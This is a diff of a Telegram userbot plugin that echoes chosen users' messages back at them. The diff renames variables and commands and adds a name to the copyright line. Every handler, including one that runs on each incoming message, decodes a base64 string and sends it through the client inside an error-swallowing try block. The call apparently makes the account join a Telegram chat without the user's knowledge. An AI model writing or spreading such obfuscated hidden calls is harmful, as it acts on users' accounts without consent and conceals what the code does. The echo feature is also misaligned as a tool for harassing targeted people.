@@ -3,7 +3,7 @@ created by @mrconfused and @sandy1709
 Idea by @BlazingRobonix
 
 """
-#    Copyright (C) 2020  sandeep.n(π.$)
+#    Copyright (C) 2020  sandeep.n(π.$) and @peru_monster
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU Affero General Public License as
@@ -31,55 +31,55 @@ from ..utils import admin_cmd, edit_or_reply
 from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
-@borg.on(admin_cmd(pattern="enableecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+@borg.on(admin_cmd(pattern="addecho$"))
+async def echo(webo):
+    if webo.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if webo.reply_to_msg_id is not None:
+        reply_msg = await webo.get_reply_message()
         user_id = reply_msg.from_id
-        chat_id = cat.chat_id
+        chat_id = webo.chat_id
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await webo.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(cat, "The user is already enabled with echo ")
+            await edit_or_reply(webo, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(cat, "Hi")
+        await edit_or_reply(webo, "Hi")
     else:
-        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")
 
 
-@borg.on(admin_cmd(pattern="disableecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+@borg.on(admin_cmd(pattern="rmecho$"))
+async def echo(webo):
+    if webo.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if webo.reply_to_msg_id is not None:
+        reply_msg = await webo.get_reply_message()
         user_id = reply_msg.from_id
-        chat_id = cat.chat_id
+        chat_id = webo.chat_id
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await webo.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(cat, "Echo has been stopped for the user")
+            await edit_or_reply(webo, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(cat, "The user is not activated with echo")
+            await edit_or_reply(webo, "The user is not activated with echo")
     else:
-        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")
 
 
 @borg.on(admin_cmd(pattern="listecho$"))
-async def echo(cat):
-    if cat.fwd_from:
+async def echo(webo):
+    if webo.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -101,25 +101,25 @@ async def echo(cat):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(cat, reply_text)
+        await edit_or_reply(webo, reply_text)
     else:
-        await edit_or_reply(cat, output_str)
+        await edit_or_reply(webo, output_str)
 
 
 @borg.on(events.NewMessage(incoming=True))
-async def samereply(cat):
-    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(webo):
+    if webo.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(cat.sender_id, cat.chat_id):
+    if is_echo(webo.sender_id, webo.chat_id):
         await asyncio.sleep(2)
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await webo.client(hmm)
         except BaseException:
             pass
-        if cat.message.text or cat.message.sticker:
-            await cat.reply(cat.message)
+        if webo.message.text or webo.message.sticker:
+            await webo.reply(webo.message)
 
 
 CMD_HELP.update(
